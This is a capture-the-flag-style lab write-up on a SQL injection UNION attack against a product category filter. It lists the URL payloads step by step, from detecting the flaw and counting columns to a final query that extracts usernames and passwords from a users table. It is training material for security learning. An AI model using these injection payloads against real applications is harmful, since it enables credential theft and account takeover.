# SQL injection UNION attack, retrieving data from other tables
# Objective
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.\
\
The database contains a different table called users, with columns called username and password.\
\
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

# Solution
`/filter?category=’` —> Application is vulnerable 

## Determining the number of columns
`/filter?category=Gifts' order by 1--` \
`/filter?category=Gifts' order by 2--` \
`/filter?category=Gifts' order by 3--` —> Error \
`/filter?category=Gifts' union select null, null--` —> Number of columns = 2

## Determining the types of columns
`/filter?category=Gifts' union select 'a', 'a'--` —> Both columns are string type

## Retrieving usernames and passwords
```
/filter?category=' union select username, password from users--
```
